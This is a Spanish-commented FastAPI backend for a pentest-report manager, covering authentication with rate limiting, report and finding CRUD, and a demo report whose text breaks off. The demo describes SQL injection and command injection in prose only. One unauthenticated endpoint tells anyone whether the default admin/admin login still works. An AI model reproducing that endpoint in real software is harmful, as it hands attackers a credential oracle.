from fastapi import FastAPI, HTTPException, Depends, UploadFile, File, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, JSONResponse
from sqlalchemy import func
from sqlalchemy.orm import Session
from typing import List
import hashlib
import os
import secrets
import sys
import tempfile
import shutil
import threading
import time as _time
from datetime import datetime
import models, schemas, database, auth
from database import engine, get_db, db_path

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if not os.path.exists(os.path.join(BASE_DIR, "index.html")):
    BASE_DIR = os.getcwd()

models.Base.metadata.create_all(bind=engine)

from migrations import run_migrations
run_migrations(engine)

# No se siembra ningún usuario por defecto. En el primer arranque la BD está
# vacía de usuarios y el frontend muestra la configuración inicial para crear la
# primera cuenta (ver /api/auth/needs-setup y /api/auth/setup).

# Documentación interactiva (Swagger/ReDoc/OpenAPI) DESACTIVADA por defecto:
# expone públicamente todo el mapa de la API a un atacante anónimo. Se puede
# reactivar en entornos de desarrollo con ENABLE_DOCS=1.
_enable_docs = os.environ.get("ENABLE_DOCS", "0") == "1"

app = FastAPI(
    title="Pwnly API",
    description="API para gestión de reportes de pentesting",
    version="1.0.0",
    docs_url="/docs" if _enable_docs else None,
    redoc_url="/redoc" if _enable_docs else None,
    openapi_url="/openapi.json" if _enable_docs else None,
)

# Orígenes permitidos para CORS. Lista explícita (separada por comas en
# ALLOWED_ORIGINS) en lugar de wildcard: "*" junto a allow_credentials=True
# viola la especificación CORS y abre la API a cualquier dominio.
ALLOWED_ORIGINS = [
    origin.strip()
    for origin in os.environ.get(
        "ALLOWED_ORIGINS",
        "http://localhost:8000,http://127.0.0.1:8000",
    ).split(",")
    if origin.strip()
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"],
    allow_headers=["Content-Type"],
)

# Compresión GZip: el frontend son ficheros grandes (js/app.js ~290 KB,
# css/styles.css ~130 KB, js/plantillas.json ~60 KB) y las respuestas JSON del
# API pueden ser voluminosas (un informe con muchos hallazgos e imágenes). Con
# gzip esos payloads bajan ~70-80 %, acelerando notablemente la carga.
from starlette.middleware.gzip import GZipMiddleware

app.add_middleware(GZipMiddleware, minimum_size=500)


# --------------------------------------------------------------------------- #
# Cabeceras de seguridad HTTP
# --------------------------------------------------------------------------- #
# Se aplican a TODAS las respuestas. Puntos clave para una app de informes de
# pentesting confidenciales:
#   - X-Robots-Tag noindex: impide que buscadores indexen la app / los informes
#     (un informe no debe aparecer nunca en resultados de Google).
#   - X-Frame-Options SAMEORIGIN: evita clickjacking embebiendo la web en un
#     iframe de terceros (SAMEORIGIN, no DENY, porque la exportación a HTML usa
#     un iframe del propio origen para renderizar el informe).
#   - HSTS: sólo si la petición llegó por HTTPS, para no romper el acceso local
#     por HTTP durante el desarrollo.
_SECURITY_HEADERS = {
    "X-Frame-Options": "SAMEORIGIN",
    "X-Content-Type-Options": "nosniff",
    "Referrer-Policy": "no-referrer",
    "X-Robots-Tag": "noindex, nofollow, noarchive",
    "Permissions-Policy": "camera=(), microphone=(), geolocation=()",
    "Cross-Origin-Opener-Policy": "same-origin",
}


@app.middleware("http")
async def _security_headers(request: Request, call_next):
    response = await call_next(request)
    for k, v in _SECURITY_HEADERS.items():
        response.headers.setdefault(k, v)
    proto = request.headers.get("x-forwarded-proto", request.url.scheme)
    if proto == "https":
        response.headers.setdefault(
            "Strict-Transport-Security", "max-age=31536000; includeSubDomains"
        )
    return response

from starlette.staticfiles import StaticFiles as StarletteStaticFiles

class NoCacheStaticFiles(StarletteStaticFiles):
    def file_response(self, *args, **kwargs):
        response = super().file_response(*args, **kwargs)
        response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate, max-age=0"
        response.headers["Pragma"] = "no-cache"
        response.headers["Expires"] = "0"
        return response

app.mount("/css", NoCacheStaticFiles(directory=os.path.join(BASE_DIR, "css")), name="css")
app.mount("/js", NoCacheStaticFiles(directory=os.path.join(BASE_DIR, "js")), name="js")
app.mount("/assets", NoCacheStaticFiles(directory=os.path.join(BASE_DIR, "assets")), name="assets")


@app.get("/api")
def api_info():
    return {"message": "Pwnly API", "version": "1.0.0"}


@app.get("/")
def root():
    return FileResponse(os.path.join(BASE_DIR, "index.html"))


# --------------------------------------------------------------------------- #
# Autenticación
# --------------------------------------------------------------------------- #
# --------------------------------------------------------------------------- #
# Anti fuerza bruta en el login (limitación de intentos en memoria)
# --------------------------------------------------------------------------- #
# Sin esto, un tercero puede probar contraseñas ilimitadamente contra /login
# hasta dar con una débil y ver TODOS los informes. Se bloquea por IP tras varios
# fallos dentro de una ventana. Estado en memoria (suficiente para el despliegue
# monoproceso habitual); para varios workers, usar un backend compartido (Redis).
_LOGIN_MAX_FAILS = int(os.environ.get("LOGIN_MAX_FAILS", "5"))
# Límite adicional por nombre de usuario: evita que rotar la IP sirva para
# adivinar la contraseña de una cuenta. Más holgado que el de IP para que un
# tercero no pueda dejar fuera al propietario con unos pocos intentos.
_LOGIN_MAX_FAILS_USER = int(os.environ.get("LOGIN_MAX_FAILS_USER", "20"))
_LOGIN_WINDOW = int(os.environ.get("LOGIN_WINDOW_SECONDS", "900"))  # 15 min
_LOGIN_MAX_TRACKED = 10000  # tope de claves en memoria
_login_fails: dict = {}
_login_lock = threading.Lock()

# IPs de proxies inversos de confianza (separadas por comas). Sólo si la conexión
# llega desde uno de ellos se interpreta X-Forwarded-For; en cualquier otro caso
# la cabecera la controla el cliente y se ignora.
_TRUSTED_PROXIES = {p.strip() for p in os.environ.get("TRUSTED_PROXIES", "").split(",") if p.strip()}


def _client_ip(request: Request) -> str:
    peer = request.client.host if request.client else "unknown"
    if peer not in _TRUSTED_PROXIES:
        return peer
    # Detrás de un proxy de confianza: el proxy AÑADE la IP del cliente al final,
    # así que se recorre de derecha a izquierda saltando proxies de confianza. La
    # primera entrada (la de más a la izquierda) la puede falsificar el cliente.
    xff = [h.strip() for h in request.headers.get("x-forwarded-for", "").split(",") if h.strip()]
    for hop in reversed(xff):
        if hop not in _TRUSTED_PROXIES:
            return hop
    return peer


def _login_keys(ip: str, username: str):
    """(clave, límite) de cada contador que aplica a un intento de login."""
    return (
        (f"ip:{ip}", _LOGIN_MAX_FAILS),
        (f"user:{(username or '').strip().lower()}", _LOGIN_MAX_FAILS_USER),
    )


def _login_retry_after(ip: str, username: str = "") -> int:
    """Segundos que quedan de bloqueo para esta IP/usuario, o 0 si puede intentar."""
    now = _time.time()
    retry = 0
    with _login_lock:
        for key, limit in _login_keys(ip, username):
            fails = [t for t in _login_fails.get(key, []) if now - t < _LOGIN_WINDOW]
            if fails:
                _login_fails[key] = fails
            else:
                _login_fails.pop(key, None)
            if len(fails) >= limit:
                retry = max(retry, max(1, int(_LOGIN_WINDOW - (now - fails[0]))))
    return retry


def _login_record_fail(ip: str, username: str = "") -> None:
    now = _time.time()
    with _login_lock:
        if len(_login_fails) >= _LOGIN_MAX_TRACKED:
            # Evita crecimiento sin límite: purga caducadas y, si sigue lleno,
            # descarta las más antiguas.
            for k in [k for k, v in _login_fails.items() if not v or now - v[-1] >= _LOGIN_WINDOW]:
                del _login_fails[k]
            if len(_login_fails) >= _LOGIN_MAX_TRACKED:
                oldest = sorted(_login_fails, key=lambda k: _login_fails[k][-1])
                for k in oldest[: len(oldest) // 10 + 1]:
                    del _login_fails[k]
        for key, _limit in _login_keys(ip, username):
            _login_fails.setdefault(key, []).append(now)


def _login_reset(ip: str, username: str = "") -> None:
    with _login_lock:
        for key, _limit in _login_keys(ip, username):
            _login_fails.pop(key, None)


# --------------------------------------------------------------------------- #
# Política de contraseñas
# --------------------------------------------------------------------------- #
_WEAK_PASSWORDS = {"admin", "administrator", "password", "contraseña", "123456",
                   "12345678", "qwerty", "pwnly", "changeme", "root"}


def _validate_password_strength(password: str, username: str = "") -> None:
    """Rechaza contraseñas triviales. Lanza HTTP 400 si no cumple."""
    if len(password or "") < 8:
        raise HTTPException(status_code=400, detail="La contraseña debe tener al menos 8 caracteres")
    if password.lower() in _WEAK_PASSWORDS:
        raise HTTPException(status_code=400, detail="Esa contraseña es demasiado común; elige otra")
    if username and password.lower() == username.lower():
        raise HTTPException(status_code=400, detail="La contraseña no puede ser igual al nombre de usuario")


def _using_default_password(user: models.User) -> bool:
    """True si la cuenta 'admin' conserva la contraseña por defecto 'admin'.

    Se usa para (a) mostrar la pista de credenciales en el login y (b) avisar al
    usuario nada más entrar de que debería cambiarla. En cuanto la contraseña se
    cambia, ambos avisos desaparecen automáticamente.
    """
    return user.username == "admin" and auth.verify_password("admin", user.password_hash)


def _cookie_is_secure(request: Request) -> bool:
    """La cookie de sesión debe marcarse Secure cuando se sirve por HTTPS, para
    que el navegador nunca la envíe por HTTP en claro. Se detecta el esquema real
    (incluso detrás de un proxy inverso, vía X-Forwarded-Proto). Override manual
    con COOKIE_SECURE=1/0."""
    override = os.environ.get("COOKIE_SECURE")
    if override in ("1", "true", "True"):
        return True
    if override in ("0", "false", "False"):
        return False
    proto = request.headers.get("x-forwarded-proto", request.url.scheme)
    return proto == "https"


def _auth_response(user: models.User, request: Request, message: str = None) -> JSONResponse:
    token = auth.create_token(user)
    content = {
        "token": token,
        "username": user.username,
        "using_default_password": _using_default_password(user),
    }
    if message:
        content["message"] = message
    response = JSONResponse(content=content)
    response.set_cookie(
        key=auth.COOKIE_NAME,
        value=token,
        httponly=True,
        samesite="lax",
        secure=_cookie_is_secure(request),
        max_age=auth.TOKEN_TTL,
    )
    return response


@app.get("/api/auth/needs-setup")
def needs_setup(db: Session = Depends(get_db)):
    """Indica si la app está sin configurar (no hay ningún usuario todavía).

    El frontend lo usa para mostrar la pantalla de configuración inicial en lugar
    del login. Sólo revela un booleano, sin datos sensibles.
    """
    return {"needs_setup": not auth.users_exist(db)}


@app.get("/api/auth/default-credentials")
def default_credentials(db: Session = Depends(get_db)):
    """Indica si la cuenta 'admin' sigue usando la contraseña por defecto 'admin'.

    El login lo consulta (sin autenticar) para mostrar la pista de credenciales
    por defecto sólo mientras siga siendo válida. Si el admin cambia su
    contraseña, deja de responder True y la pista desaparece. No revela ningún
    dato sensible: sólo un booleano.
    """
    user = db.query(models.User).filter(models.User.username == "admin").first()
    active = bool(user and auth.verify_password("admin", user.password_hash))
    return {"default_admin": active}


# Serializa el setup inicial: la comprobación "no hay usuarios" y el INSERT deben
# ser atómicos, o dos solicitudes concurrentes crearían dos cuentas (TOCTOU).
# Válido para un solo proceso (despliegue por defecto); con varios workers habría
# que mover la exclusión a la base de datos.
_setup_lock = threading.Lock()


@app.post("/api/auth/setup")
def setup_first_user(payload: schemas.CreateUserRequest, request: Request, db: Session = Depends(get_db)):
    """Crea la PRIMERA cuenta de la aplicación.

    Sólo funciona cuando la base de datos no tiene ningún usuario; una vez creada
    la primera cuenta, este endpoint queda bloqueado (409) y la gestión de
    usuarios pasa a requerir autenticación (/api/users).
    """
    if auth.users_exist(db):
        raise HTTPException(status_code=409, detail="La aplicación ya está configurada")

    username = (payload.username or "").strip()
    if not username:
        raise HTTPException(status_code=400, detail="El nombre de usuario no puede estar vacío")
    _validate_password_strength(payload.password, username)

    # El hash PBKDF2 (lento) se calcula fuera del lock para mantenerlo breve.
    password_hash = auth.hash_password(payload.password)

    with _setup_lock:
        # Repetir la comprobación dentro del lock: sólo gana la primera solicitud.
        db.expire_all()
        if auth.users_exist(db):
            raise HTTPException(status_code=409, detail="La aplicación ya está configurada")
        user = models.User(username=username, password_hash=password_hash)
        db.add(user)
        db.commit()
    db.refresh(user)
    return _auth_response(user, request, message="Cuenta creada correctamente")


@app.post("/api/auth/login")
def login(credentials: schemas.LoginRequest, request: Request, db: Session = Depends(get_db)):
    # Anti fuerza bruta: si esta IP ha superado el límite de fallos, se rechaza
    # sin ni siquiera comprobar la contraseña.
    ip = _client_ip(request)
    retry = _login_retry_after(ip, credentials.username)
    if retry:
        raise HTTPException(
            status_code=429,
            detail="Demasiados intentos fallidos. Inténtalo de nuevo más tarde.",
            headers={"Retry-After": str(retry)},
        )

    user = db.query(models.User).filter(models.User.username == credentials.username).first()
    if not user or not auth.verify_password(credentials.password, user.password_hash):
        _login_record_fail(ip, credentials.username)
        raise HTTPException(status_code=401, detail="Usuario o contraseña incorrectos")

    _login_reset(ip, credentials.username)
    return _auth_response(user, request)


@app.post("/api/auth/logout")
def logout():
    response = JSONResponse(content={"message": "Sesión cerrada"})
    response.delete_cookie(auth.COOKIE_NAME)
    return response


@app.get("/api/auth/me")
def get_me(user: models.User = Depends(auth.require_auth)):
    return {"username": user.username, "using_default_password": _using_default_password(user)}


@app.post("/api/auth/change-password")
def change_password(
    payload: schemas.ChangePasswordRequest,
    request: Request,
    user: models.User = Depends(auth.require_auth),
    db: Session = Depends(get_db),
):
    if not auth.verify_password(payload.current_password, user.password_hash):
        raise HTTPException(status_code=400, detail="La contraseña actual es incorrecta")
    if payload.new_password == payload.current_password:
        raise HTTPException(status_code=400, detail="La nueva contraseña debe ser distinta de la actual")
    _validate_password_strength(payload.new_password, user.username)

    user.password_hash = auth.hash_password(payload.new_password)
    db.commit()
    db.refresh(user)
    # Al cambiar la contraseña se invalidan los tokens previos; emitimos uno nuevo.
    return _auth_response(user, request, message="Contraseña actualizada correctamente")


# --------------------------------------------------------------------------- #
# Gestión de usuarios
# --------------------------------------------------------------------------- #
@app.get("/api/users", response_model=List[schemas.UserInfo])
def list_users(db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    return db.query(models.User).order_by(models.User.id).all()


@app.post("/api/users", response_model=schemas.UserInfo)
def create_user(
    payload: schemas.CreateUserRequest,
    db: Session = Depends(get_db),
    _user: models.User = Depends(auth.require_auth),
):
    username = payload.username.strip()
    if not username:
        raise HTTPException(status_code=400, detail="El nombre de usuario no puede estar vacío")
    _validate_password_strength(payload.password, username)
    if db.query(models.User).filter(models.User.username == username).first():
        raise HTTPException(status_code=400, detail="Ya existe un usuario con ese nombre")

    user = models.User(username=username, password_hash=auth.hash_password(payload.password))
    db.add(user)
    db.commit()
    db.refresh(user)
    return user


@app.delete("/api/users/{user_id}")
def delete_user(
    user_id: int,
    db: Session = Depends(get_db),
    current_user: models.User = Depends(auth.require_auth),
):
    user = db.query(models.User).filter(models.User.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="Usuario no encontrado")
    # Se permite eliminar cualquier usuario —incluido el propio con el que se está
    # conectado— siempre que quede al menos otro usuario registrado. Si se elimina
    # la cuenta propia, su sesión deja de ser válida y el frontend redirige al login.
    if db.query(models.User).count() <= 1:
        raise HTTPException(status_code=400, detail="Debe existir al menos un usuario registrado")

    deleted_self = user.id == current_user.id
    db.delete(user)
    db.commit()
    return {"message": "Usuario eliminado correctamente", "deleted_self": deleted_self}


@app.get("/api/reports", response_model=List[schemas.ReportList])
def get_reports(db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    # Conteo de hallazgos por reporte en UNA sola consulta agrupada, en vez de un
    # COUNT por reporte (N+1). Con muchos reportes esto pasa de N+1 consultas a 2.
    counts = dict(
        db.query(models.Finding.report_id, func.count(models.Finding.id))
        .group_by(models.Finding.report_id)
        .all()
    )
    reports = db.query(models.Report).all()
    result = []
    for report in reports:
        report_data = schemas.ReportList.model_validate(report)
        report_data.findings_count = counts.get(report.id, 0)
        result.append(report_data)
    return result


@app.get("/api/reports/{report_id}", response_model=schemas.ReportResponse)
def get_report(report_id: int, db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    report = db.query(models.Report).filter(models.Report.id == report_id).first()
    if not report:
        raise HTTPException(status_code=404, detail="Reporte no encontrado")
    return report


@app.post("/api/reports", response_model=schemas.ReportResponse)
def create_report(report: schemas.ReportCreate, db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    db_report = models.Report(**report.model_dump())
    db.add(db_report)
    db.commit()
    db.refresh(db_report)
    return db_report


@app.put("/api/reports/{report_id}", response_model=schemas.ReportResponse)
def update_report(report_id: int, report: schemas.ReportUpdate, db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    db_report = db.query(models.Report).filter(models.Report.id == report_id).first()
    if not db_report:
        raise HTTPException(status_code=404, detail="Reporte no encontrado")
    
    for key, value in report.model_dump().items():
        setattr(db_report, key, value)
    
    db.commit()
    db.refresh(db_report)
    return db_report


@app.delete("/api/reports/{report_id}")
def delete_report(report_id: int, db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    db_report = db.query(models.Report).filter(models.Report.id == report_id).first()
    if not db_report:
        raise HTTPException(status_code=404, detail="Reporte no encontrado")
    
    db.delete(db_report)
    db.commit()
    return {"message": "Reporte eliminado correctamente"}


@app.get("/api/reports/{report_id}/findings", response_model=List[schemas.FindingResponse])
def get_findings(report_id: int, db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    findings = db.query(models.Finding).filter(
        models.Finding.report_id == report_id
    ).order_by(models.Finding.order_index).all()
    return findings


@app.get("/api/findings/{finding_id}", response_model=schemas.FindingResponse)
def get_finding(finding_id: int, db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    finding = db.query(models.Finding).filter(models.Finding.id == finding_id).first()
    if not finding:
        raise HTTPException(status_code=404, detail="Hallazgo no encontrado")
    return finding


@app.post("/api/reports/{report_id}/findings", response_model=schemas.FindingResponse)
def create_finding(report_id: int, finding: schemas.FindingCreate, db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    report = db.query(models.Report).filter(models.Report.id == report_id).first()
    if not report:
        raise HTTPException(status_code=404, detail="Reporte no encontrado")
    
    db_finding = models.Finding(
        **finding.model_dump(exclude={'order_index'}),
        report_id=report_id,
        order_index=finding.order_index
    )
    db.add(db_finding)
    db.commit()
    db.refresh(db_finding)
    return db_finding


@app.post("/api/reports/{report_id}/findings/bulk", response_model=List[schemas.FindingResponse])
def create_findings_bulk(
    report_id: int,
    findings: List[schemas.FindingCreate],
    db: Session = Depends(get_db),
    _user: models.User = Depends(auth.require_auth),
):
    """Crea varios hallazgos en una sola llamada (importaciones y scripts).

    Los hallazgos se añaden al final del reporte conservando el orden de la
    lista enviada, sin necesidad de calcular `order_index` desde el cliente.
    """
    report = db.query(models.Report).filter(models.Report.id == report_id).first()
    if not report:
        raise HTTPException(status_code=404, detail="Reporte no encontrado")

    last_order = db.query(func.max(models.Finding.order_index)).filter(
        models.Finding.report_id == report_id
    ).scalar()
    next_order = 0 if last_order is None else last_order + 1

    created = []
    try:
        for offset, finding in enumerate(findings):
            db_finding = models.Finding(
                **finding.model_dump(exclude={'order_index'}),
                report_id=report_id,
                order_index=next_order + offset,
            )
            db.add(db_finding)
            created.append(db_finding)
        db.commit()
    except Exception:
        db.rollback()
        raise
    for db_finding in created:
        db.refresh(db_finding)
    return created


@app.put("/api/findings/{finding_id}", response_model=schemas.FindingResponse)
def update_finding(finding_id: int, finding: schemas.FindingUpdate, db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    db_finding = db.query(models.Finding).filter(models.Finding.id == finding_id).first()
    if not db_finding:
        raise HTTPException(status_code=404, detail="Hallazgo no encontrado")
    
    for key, value in finding.model_dump().items():
        setattr(db_finding, key, value)
    
    db.commit()
    db.refresh(db_finding)
    return db_finding


@app.patch("/api/findings/{finding_id}", response_model=schemas.FindingResponse)
def patch_finding(finding_id: int, finding: schemas.FindingPatch, db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    """Actualiza solo los campos enviados, sin resetear el resto del hallazgo."""
    db_finding = db.query(models.Finding).filter(models.Finding.id == finding_id).first()
    if not db_finding:
        raise HTTPException(status_code=404, detail="Hallazgo no encontrado")

    data = finding.model_dump(exclude_unset=True)
    if "title" in data and not (data["title"] or "").strip():
        raise HTTPException(status_code=422, detail="El título no puede quedar vacío")

    for key, value in data.items():
        setattr(db_finding, key, value)

    db.commit()
    db.refresh(db_finding)
    return db_finding


@app.delete("/api/findings/{finding_id}")
def delete_finding(finding_id: int, db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    db_finding = db.query(models.Finding).filter(models.Finding.id == finding_id).first()
    if not db_finding:
        raise HTTPException(status_code=404, detail="Hallazgo no encontrado")

    report_id = db_finding.report_id
    db.delete(db_finding)
    db.flush()

    remaining = db.query(models.Finding).filter(
        models.Finding.report_id == report_id
    ).order_by(models.Finding.order_index).all()

    for idx, f in enumerate(remaining):
        f.order_index = idx

    db.commit()
    return {"message": "Hallazgo eliminado correctamente"}


@app.post("/api/reports/{report_id}/findings/reorder")
def reorder_findings(report_id: int, finding_ids: List[int], db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    # Cargamos de una vez todos los hallazgos del reporte (una consulta en lugar
    # de una por id) y aplicamos el nuevo orden desde un mapa en memoria.
    findings_by_id = {
        f.id: f
        for f in db.query(models.Finding).filter(
            models.Finding.report_id == report_id
        ).all()
    }
    for idx, finding_id in enumerate(finding_ids):
        finding = findings_by_id.get(finding_id)
        if finding:
            finding.order_index = idx
    db.commit()
    return {"message": "Orden actualizado"}


# --------------------------------------------------------------------------- #
# Temas de informe: plantilla HTML + CSS creados íntegramente por el usuario
# (no hay temas de fábrica; ver js/theme-engine.js para el motor de plantillas)
# --------------------------------------------------------------------------- #
@app.get("/api/themes", response_model=List[schemas.ThemeResponse])
def list_themes(db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    return db.query(models.Theme).order_by(models.Theme.id).all()


@app.post("/api/themes", response_model=schemas.ThemeResponse)
def create_theme(payload: schemas.ThemeCreate, db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    name = payload.name.strip()
    if not name:
        raise HTTPException(status_code=400, detail="El nombre del tema no puede estar vacío")

    if payload.slug.strip().lower() == "default":
        # "default" es el tema integrado (siempre disponible y de solo lectura).
        raise HTTPException(status_code=400, detail='El identificador default está reservado al tema por defecto')

    existing = db.query(models.Theme).filter(models.Theme.slug == payload.slug).first()
    if existing:
        # Upsert: actualizar tema existente.
        existing.name = name
        existing.html_template = payload.html_template
        existing.custom_css = payload.custom_css
        db.commit()
        db.refresh(existing)
        return existing

    theme = models.Theme(slug=payload.slug, name=name, html_template=payload.html_template, custom_css=payload.custom_css)
    db.add(theme)
    db.commit()
    db.refresh(theme)
    return theme


@app.delete("/api/themes/{theme_id}")
def delete_theme(theme_id: int, db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    theme = db.query(models.Theme).filter(models.Theme.id == theme_id).first()
    if not theme:
        raise HTTPException(status_code=404, detail="Tema no encontrado")
    db.delete(theme)
    db.commit()
    return {"message": "Tema eliminado correctamente"}


# --------------------------------------------------------------------------- #
# Preferencias globales de la aplicación (en la BD → se exportan con todo lo demás)
# --------------------------------------------------------------------------- #
def _get_or_create_settings(db: Session) -> "models.AppSettings":
    settings = db.query(models.AppSettings).first()
    if settings is None:
        settings = models.AppSettings(id=1)
        db.add(settings)
        db.commit()
        db.refresh(settings)
    return settings


@app.get("/api/settings", response_model=schemas.AppSettingsResponse)
def get_settings(db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    return _get_or_create_settings(db)


@app.put("/api/settings", response_model=schemas.AppSettingsResponse)
def update_settings(payload: schemas.AppSettingsUpdate, db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    settings = _get_or_create_settings(db)
    data = payload.model_dump()
    for key, value in data.items():
        if key == 'pdf_show_severity_bars':
            value = 1 if value else 0
        setattr(settings, key, value)
    db.commit()
    db.refresh(settings)
    return settings


# --------------------------------------------------------------------------- #
# Plantillas de hallazgo del usuario (base de conocimiento)
# --------------------------------------------------------------------------- #
@app.get("/api/finding-templates", response_model=List[schemas.FindingTemplateResponse])
def list_finding_templates(db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    return db.query(models.FindingTemplate).order_by(models.FindingTemplate.name).all()


@app.post("/api/finding-templates", response_model=schemas.FindingTemplateResponse)
def create_finding_template(payload: schemas.FindingTemplateCreate, db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    name = payload.name.strip()
    if not name:
        raise HTTPException(status_code=400, detail="El nombre de la plantilla no puede estar vacío")

    data = payload.model_dump()
    existing = db.query(models.FindingTemplate).filter(models.FindingTemplate.slug == payload.slug).first()
    if existing:
        for k, v in data.items():
            setattr(existing, k, v)
        db.commit()
        db.refresh(existing)
        return existing

    tpl = models.FindingTemplate(**data)
    db.add(tpl)
    db.commit()
    db.refresh(tpl)
    return tpl


@app.delete("/api/finding-templates/{template_id}")
def delete_finding_template(template_id: int, db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    tpl = db.query(models.FindingTemplate).filter(models.FindingTemplate.id == template_id).first()
    if not tpl:
        raise HTTPException(status_code=404, detail="Plantilla no encontrada")
    db.delete(tpl)
    db.commit()
    return {"message": "Plantilla eliminada correctamente"}


# --------------------------------------------------------------------------- #
# Generación de PDF / HTML
# --------------------------------------------------------------------------- #
# Desde la v2.0.0 el informe se renderiza y exporta 100% en el cliente (el SPA
# ya monta el informe en HTML+CSS con las imágenes embebidas como data URLs):
#   - Exportar HTML  -> documento autocontenido generado en el navegador.
#   - Generar PDF    -> impresión nativa del navegador (Guardar como PDF) sobre
#                       la vista de impresión (@media print / @page).
# Se eliminó la dependencia de Playwright/Chromium del servidor.


@app.post("/api/demo/create")
def create_demo_report(db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    import base64

    demo_dir = os.path.join(BASE_DIR, "demo")

    def img(filename: str) -> str:
        path = os.path.join(demo_dir, filename)
        if not os.path.exists(path):
            return ""
        ext = filename.rsplit(".", 1)[-1].lower()
        mime = {"png": "image/png", "jpg": "image/jpeg", "jpeg": "image/jpeg", "webp": "image/webp"}.get(ext, "image/png")
        with open(path, "rb") as f:
            return f"data:{mime};base64,{base64.b64encode(f.read()).decode()}"

    report_data = schemas.ReportCreate(
        document_title="Informe de Pentesting Web — AcmeShop Platform",
        client_company="AcmeShop Solutions S.L.",
        target_asset="https://shop.acmeshop.com",
        auditor_company="Pwnly Security Lab",
        auditor_name="Security Research Team",
        classification=3,
        tlp_level="amber",
        classification_mode="tlp",
        version="1.0",
        date=datetime.today().strftime("%Y-%m-%d"),
        lang="es",
        has_incidents=True,
        incidents_text="Durante la auditoría se explotaron activamente vulnerabilidades críticas que permitieron acceso completo a la base de datos de usuarios y escalada de privilegios al servidor. Se recomienda parada de emergencia del servicio hasta aplicar los parches indicados.",
        audit_summary="Se ha realizado una auditoría de caja negra sobre la plataforma de comercio electrónico AcmeShop. Durante el engagement se identificaron 6 vulnerabilidades, 2 de ellas de severidad crítica que permiten comprometer completamente el sistema. El vector de ataque principal fue la inyección SQL en el formulario de autenticación, seguido de una escalada de privilegios por command injection en el módulo de gestión de archivos.",
        tests_performed="• Reconocimiento pasivo y activo (Shodan, Google Dorks, subfinder)\n• Fuzzing de directorios y parámetros (ffuf, gobuster)\n• Análisis de parámetros GET/POST con Burp Suite Pro\n• Pruebas de autenticación y autorización\n• Inyección SQL manual y automatizada (sqlmap)\n• Pruebas XSS reflejado y almacenado\n• Análisis de cabeceras HTTP y configuración TLS\n• Pruebas de escalada de privilegios en servidor",
        recommended_solutions="1. Aplicar parches críticos de SQLi y Command Injection de forma inmediata.\n2. Implementar WAF (ModSecurity o Cloudflare) como medida preventiva urgente.\n3. Revisar todos los endpoints que reciben input de usuario y aplicar prepared statements.\n4. Implementar un SIEM para detección temprana de intrusiones.\n5. Realizar un segundo ciclo de pentesting tras aplicar los parches para validar efectividad.",
        audit_type="caja_negra",
        scope_in="https://shop.acmeshop.com\nhttps://admin.acmeshop.com\n203.0.113.0/24 (infraestructura web pública)",
        scope_out="Infraestructura interna corporativa\nServicios de terceros (pasarela de pago Stripe)\nAtaques de denegación de servicio (DoS/DDoS)",
        methodology_notes="Auditoría de caja negra sin credenciales previas. Ventana de pruebas pactada de 10 días laborables con la cláusula de parada de emergencia activada.",
        methodology_standards=["owasp_wstg", "owasp_top10", "ptes", "nist_800_115"],
        tools_used="Burp Suite Pro, sqlmap, ffuf, gobuster, nmap, nuclei, subfinder, GTFOBins",
        engagement_start=datetime.today().strftime("%Y-%m-%d"),
        engagement_end=datetime.today().strftime("%Y-%m-%d"),
        show_scope_section=1,
        scope_fields_visibility={
            "scopeIn": True, "scopeOut": True, "standards": True,
            "methodologyNotes": True, "toolsUsed": True,
        },
        revision_history=[
            {"version": "0.1", "date": datetime.today().strftime("%Y-%m-%d"), "author": "Security Research Team", "changes": "Borrador inicial de hallazgos"},
            {"version": "1.0", "date": datetime.today().strftime("%Y-%m-%d"), "author": "Security Research Team", "changes": "Versión final entregada al cliente"},
        ],
    )
    report = models.Report(**report_data.model_dump())
    db.add(report)
    db.commit()
    db.refresh(report)
    rid = report.id

    findings = [
        {
            "title": "Inyección SQL en formulario de login",
            "severity": "crit",
            "cvss": "9.8",
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cve": "N/A",
            "cwe": "CWE-89",
            "owasp": "A03:2021 – Injection",
            "status": "open",
            "likelihood": "high",
            "impact_rating": "high",
            "affected_assets": "POST https://shop.acmeshop.com/admin/login\nparam: username",
            "compliance": ["PCI-DSS 6.5.1", "ISO 27001 A.14.2", "MITRE ATT&CK T1190"],
            "reference": "https://owasp.org/www-community/attacks/SQL_Injection",
            "references": ["https://cwe.mitre.org/data/definitions/89.html", "https://portswigger.net/web-security/sql-injection"],
